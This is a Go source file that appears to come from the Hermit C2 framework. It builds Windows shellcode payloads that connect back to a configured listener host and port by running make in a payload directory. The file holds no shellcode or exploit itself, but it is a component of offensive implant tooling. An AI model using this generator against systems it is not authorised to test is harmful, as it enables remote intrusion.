package payload

import (
	"fmt"
	"os"
	"slices"
	"strings"

	"github.com/google/uuid"
	"github.com/hideckies/hermit/pkg/common/meta"
	metafs "github.com/hideckies/hermit/pkg/common/meta/fs"
	"github.com/hideckies/hermit/pkg/common/utils"
	"github.com/hideckies/hermit/pkg/server/listener"
	"github.com/hideckies/hermit/pkg/server/state"
)

type Shellcode struct {
	Id        uint
	Uuid      string
	Name      string
	Os        string
	Arch      string
	Format    string
	Lprotocol string
	Lhost     string
	Lport     uint16
	Type      string
	TypeArgs  string
}

func NewShellcode(
	id uint,
	_uuid string,
	name string,
	os string,
	arch string,
	format string,
	lprotocol string,
	lhost string,
	lport uint16,
	shcType string,
	shcTypeArgs string,
) *Shellcode {
	if _uuid == "" {
		_uuid = uuid.NewString()
	}
	if name == "" {
		name = utils.GenerateRandomAnimalName(false, "shellcode")
	}

	return &Shellcode{
		Id:        id,
		Uuid:      _uuid,
		Name:      name,
		Os:        os,
		Arch:      arch,
		Format:    format,
		Lprotocol: lprotocol,
		Lhost:     lhost,
		Lport:     lport,
		Type:      shcType,     // e.g. cmd
		TypeArgs:  shcTypeArgs, // e.g. calc.exe
	}
}

func (s *Shellcode) Generate(serverState *state.ServerState) (data []byte, outFile string, err error) {
	// Get the correspoiding listener
	liss, err := serverState.DB.ListenerGetAll()
	if err != nil {
		return nil, "", err
	}
	var lis *listener.Listener = nil
	for _, _lis := range liss {
		if _lis.Protocol == s.Lprotocol && (_lis.Addr == s.Lhost || slices.Contains(_lis.Domains, s.Lhost)) && _lis.Port == s.Lport {
			lis = _lis
			break
		}
	}
	if lis == nil {
		return nil, "", fmt.Errorf("the corresponding listener not found")
	}

	// Get output path
	payloadsDir, err := metafs.GetListenerPayloadsDir(lis.Name, false)
	if err != nil {
		return nil, "", err
	}
	outFile = fmt.Sprintf("%s/%s.%s.%s", payloadsDir, s.Name, s.Arch, s.Format)

	// Get request path
	// requestPathDownload := utils.GetRandomElemString(serverState.Conf.Listener.FakeRoutes["/stager/download"])

	// Change to the paylaod directory
	if s.Os == "linux" {
		return nil, "", fmt.Errorf("linux target is not implemented yet")
	} else if s.Os == "windows" {
		// Change directory
		os.Chdir("./payload/win/shellcode")

		target := s.Arch

		outText, err := meta.ExecCommand(
			"make",
			fmt.Sprintf("PAYLOAD_NAME=%s", s.Name),
			fmt.Sprintf("PAYLOAD_ARCH=%s", s.Arch),
			fmt.Sprintf("PAYLOAD_FORMAT=%s", s.Format),
			fmt.Sprintf("LISTENER_HOST=\"%s\"", s.Lhost),
			fmt.Sprintf("LISTENER_PORT=%s", fmt.Sprint(s.Lport)),
			// fmt.Sprintf("REQUEST_PATH_DOWNLOAD=\"%s\"", requestPathDownload),
			fmt.Sprintf("SHELLCODE_TYPE=%s", s.Type),
			fmt.Sprintf("SHELLCODE_TYPE_ARGS=\"%s\"", s.TypeArgs),
			fmt.Sprintf("OUTPUT=\"%s\"", outFile),
			"-j", fmt.Sprint(serverState.NumCPU),
			target,
		)
		if err != nil {
			os.Chdir(serverState.CWD)
			return nil, "", fmt.Errorf("build error: %v", err)
		}
		if strings.Contains(strings.ToLower(outText), "error:") {
			os.Chdir(serverState.CWD)
			return nil, "", fmt.Errorf("build error: %s", outText)
		}
	}

	data, err = os.ReadFile(outFile)
	if err != nil {
		os.Chdir(serverState.CWD)
		return nil, "", err
	}

	// Go back to the current directory
	os.Chdir(serverState.CWD)

	return data, outFile, nil
}
